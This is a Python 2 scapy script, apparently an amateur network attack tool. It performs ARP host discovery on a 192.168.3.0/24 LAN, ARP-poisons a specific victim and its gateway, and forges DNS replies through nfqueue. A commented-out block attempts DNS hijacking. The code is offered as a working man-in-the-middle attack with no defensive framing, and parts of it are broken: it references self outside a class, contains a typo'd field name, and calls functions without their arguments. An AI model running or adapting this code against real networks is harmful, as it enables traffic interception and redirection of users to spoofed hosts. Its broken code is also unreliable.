''''
from scapy.all import *
from threading import Thread
def DNShijacking():
    global wg
    wg=raw_input('Please enter your IP:')
    print '[+]dns spoof!'
    nwdf=dns_spoof(joker='{}'.format(wg),match={None:None})
    print nwdf.show()
DNShijacking()


def make_reply(ip, req):
    ip = req.getlayer(IP)
    dns = req.getlayer(DNS)
    resp = IP(dst=wg, src=ip.dst) / UDP(dport=ip.sport, sport=ip.dport)
    rdata = self.match.get(dns.qd.qna.me, self.joker)
    resp /= DNS(id=dns.id, qr=1, qd=dns.qd,
                an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=rdata))
    return resp
make_reply()
'''
from scapy.all import *
from threading import Thread
import os
import sys
#Fast discovery host
def kuaisu():
    print '[*]Find the LAN host .'
    ans,unas=sr(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.3.0/24"),timeout=5,retry=3)
    for s,r in ans:
        return r[Ether].src

#ARP poisoning
def poison():
    send(ARP(op=2,pdst="192.168.3.41",psrc="192.168.3.1",hwdst="3C:46:D8:2A:CF:0B"))
    send(ARP(op=2,pdst="192.168.3.1",psrc="192.168.3.41",hwdst="00:0c:29:c7:e7:d8"))

def restore():
    send(ARP(op=2,pdst="192.168.3.1",psrc="192.168.3.41",hwdst="00:0c:29:c7:e7:d8"))
    send(ARP(op=2,pdst="192.168.3.41",psrc="192.168.3.1",hwdst="3C:46:D8:2A:CF:0B"))
    sys.exit()

def cb(payload):
    data = payload.get_data()
    pkt = IP(data)
    localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]


def jiec(payload, pkt, rIP):
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rIP))
    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
    print '[+] Sent spoofed packet for %s' % pkt[DNSQR].qname[:-1]

kuaisu()
poison()
restore()
cb()
jiec()
